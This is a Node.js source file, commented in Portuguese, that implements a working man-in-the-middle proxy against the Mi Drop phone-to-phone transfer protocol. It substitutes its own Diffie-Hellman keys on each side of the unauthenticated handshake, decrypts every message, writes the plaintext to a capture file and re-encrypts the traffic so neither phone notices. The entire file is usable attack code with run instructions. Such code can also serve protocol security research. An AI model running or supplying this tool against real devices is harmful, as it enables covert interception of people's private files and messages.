// Proxy MITM do Mi Drop: faz um DH separado com cada celular, decifra o tráfego,
// loga em claro e recifra para o outro lado. O handshake não é autenticado,
// então nenhum dos dois celulares percebe a troca.
//
//   Celular A (sender) <--DH#1--> [proxy] <--DH#2--> Celular B (receiver)
//
// Uso: node midrop_proxy.js <IP_CELULAR_B> [PORTA_B=8181] [PORTA_LOCAL=8181]
// Variáveis: LISTEN_HOST (padrão 127.0.0.1), CAPTURE_FILE (padrão midrop_capture.jsonl)
const net = require('net');
const fs = require('fs');
const {
    generateKeyPair, parseSpki, computeSharedSecret,
    encryptPacket, decryptToBuffer
} = require('./midrop_crypto');

const [targetHost, targetPortArg, localPortArg] = process.argv.slice(2);
if (!targetHost) {
    console.log('Uso: node midrop_proxy.js <IP_CELULAR_B> [PORTA_B=8181] [PORTA_LOCAL=8181]');
    process.exit(1);
}

const TARGET_PORT = parseInt(targetPortArg || '8181', 10);
const LOCAL_PORT = parseInt(localPortArg || '8181', 10);
const LISTEN_HOST = process.env.LISTEN_HOST || '127.0.0.1';
const CAPTURE_FILE = process.env.CAPTURE_FILE || 'midrop_capture.jsonl';
const MAX_SHOW = 4000;
const EOL = '\n'; // os celulares reais terminam cada linha só com \n

let connCount = 0;

const server = net.createServer((a) => {
    const id = ++connCount;
    const L = (...x) => console.log(`[#${id}]`, ...x);
    L(`[+] Celular A conectado: ${a.remoteAddress}:${a.remotePort}`);

    const b = new net.Socket();
    a.setEncoding('utf8');
    b.setEncoding('utf8');
    a.setKeepAlive(true, 5000);
    b.setKeepAlive(true, 5000);

    const s = {
        group: null,
        keysA: null, secretA: null,   // nós somos o receiver para o A
        keysB: null, secretB: null,   // nós somos o sender para o B
        bufA: '', bufB: '',
        early: [],                    // pacotes cifrados que chegaram antes do handshake fechar
        closed: false
    };

    function record(dir, kind, text) {
        fs.appendFileSync(CAPTURE_FILE, JSON.stringify({
            t: new Date().toISOString(), conn: id, dir, kind, text
        }) + '\n');

        let shown = text;
        try { shown = JSON.stringify(JSON.parse(text), null, 2); } catch { /* não é JSON */ }
        if (shown.length > MAX_SHOW) {
            shown = shown.slice(0, MAX_SHOW) + `\n... (+${shown.length - MAX_SHOW} chars; completo em ${CAPTURE_FILE})`;
        }
        console.log(`\n[#${id}] ${dir} (${kind}, ${text.length} chars)\n${shown}`);
    }

    function closeBoth(reason) {
        if (s.closed) return;
        s.closed = true;
        L(`[-] ${reason}`);
        a.destroy();
        b.destroy();
    }

    const pkParam = (keys) => encodeURIComponent(JSON.stringify({ pk: keys.publicKeyBase64 }));

    // ---- A -> proxy: send_pk ----
    function onSendPk(iq) {
        try {
            const pk = JSON.parse(decodeURIComponent(iq.param)).pk;
            const { y, p, g, format } = parseSpki(pk);
            s.group = { p, g };

            L(`[A->B] send_pk de "${iq.from}" profile=${iq.profile} versionCode=${iq.versionCode}`);
            L(`        chave ${format}, grupo de ${p.toString(2).length} bits, p=${p.toString(16).slice(0, 16)}...`);

            s.keysA = generateKeyPair(s.group);                  // nossa chave voltada para o A
            s.secretA = computeSharedSecret(y, s.keysA.x, s.group);
            s.keysB = generateKeyPair(s.group);                  // nossa chave voltada para o B (mesmo grupo do A)
        } catch (e) {
            return closeBoth(`send_pk inválido: ${e.message}`);
        }

        // Mesmo send_pk do A, trocando só a chave pública pela nossa.
        const toB = { iq: { ...iq, param: pkParam(s.keysB) } };
        b.connect(TARGET_PORT, targetHost, () => {
            L(`[+] Conectado ao Celular B (${targetHost}:${TARGET_PORT})`);
            b.write(JSON.stringify(toB) + EOL);
        });
    }

    // ---- B -> proxy: send_pk_ack ----
    function onSendPkAck(iq, rawLine) {
        L(`[B->A] send_pk_ack profile=${iq.profile} versionCode=${iq.versionCode}`);

        if (!iq.param) {
            L('[!] B recusou a chave (sem param); repassando a recusa ao A.');
            a.write(rawLine + EOL);
            return;
        }

        try {
            const pk = JSON.parse(decodeURIComponent(iq.param)).pk;
            const { y, p, g } = parseSpki(pk);
            if (p !== s.group.p || g !== s.group.g) {
                throw new Error('B respondeu em outro grupo DH; o proxy usou o grupo do A');
            }
            s.secretB = computeSharedSecret(y, s.keysB.x, s.group);
        } catch (e) {
            return closeBoth(`send_pk_ack inválido: ${e.message}`);
        }

        // Mesmo ack do B, trocando só a chave pública pela nossa (no grupo do A).
        a.write(JSON.stringify({ iq: { ...iq, param: pkParam(s.keysA) } }) + EOL);
        L('[+] Handshake fechado nos dois lados. Daqui em diante, tudo é decifrado.');

        const queued = s.early;
        s.early = [];
        for (const [side, line] of queued) handleEncrypted(side, line);
    }

    // ---- Pacotes cifrados: decifra, loga, recifra para o outro lado ----
    function handleEncrypted(side, line) {
        if (!s.secretA || !s.secretB) {
            s.early.push([side, line]);
            return;
        }

        const from = side === 'A' ? s.secretA : s.secretB;
        const to = side === 'A' ? s.secretB : s.secretA;
        const dest = side === 'A' ? b : a;
        const dir = side === 'A' ? 'A -> B' : 'B -> A';

        let plain;
        try {
            plain = decryptToBuffer(from, line);
        } catch (e) {
            L(`[-] ${dir}: falha ao decifrar (${e.message}); pacote descartado.`);
            return;
        }

        record(dir, 'msg', plain.toString('utf8'));
        dest.write(encryptPacket(to, plain) + EOL); // Buffer: repassa byte a byte
    }

    function handleLine(side, line) {
        if (!line.startsWith('{')) return handleEncrypted(side, line);

        let msg;
        try { msg = JSON.parse(line); }
        catch (e) { return L(`[-] JSON inválido de ${side}: ${e.message}`); }

        const iq = msg.iq;
        if (side === 'A' && iq && iq.action === 'send_pk') return onSendPk(iq);
        if (side === 'B' && iq && iq.action === 'send_pk_ack') return onSendPkAck(iq, line);

        // Outro controle em texto puro: loga e repassa intacto.
        record(side === 'A' ? 'A -> B' : 'B -> A', 'control', line);
        (side === 'A' ? b : a).write(line + EOL);
    }

    // TCP é um fluxo: acumula e processa só linhas completas.
    function feed(side, data) {
        const key = side === 'A' ? 'bufA' : 'bufB';
        s[key] += data;
        const lines = s[key].split(/[\r\n\0]+/);
        s[key] = lines.pop();
        for (const raw of lines) {
            const line = raw.trim();
            if (line) handleLine(side, line);
        }
    }

    a.on('data', (d) => feed('A', d));
    b.on('data', (d) => feed('B', d));
    a.on('close', () => closeBoth('Celular A desconectou'));
    b.on('close', () => closeBoth('Celular B desconectou'));
    a.on('error', (e) => L('Erro no socket A:', e.message));
    b.on('error', (e) => L('Erro no socket B:', e.message));
});

server.listen(LOCAL_PORT, LISTEN_HOST, () => {
    console.log(`[*] Proxy MITM em ${LISTEN_HOST}:${LOCAL_PORT} -> ${targetHost}:${TARGET_PORT}`);
    console.log(`[*] Texto decifrado também vai para ${CAPTURE_FILE}`);
    console.log('[*] Aguardando o Celular A se conectar...');
});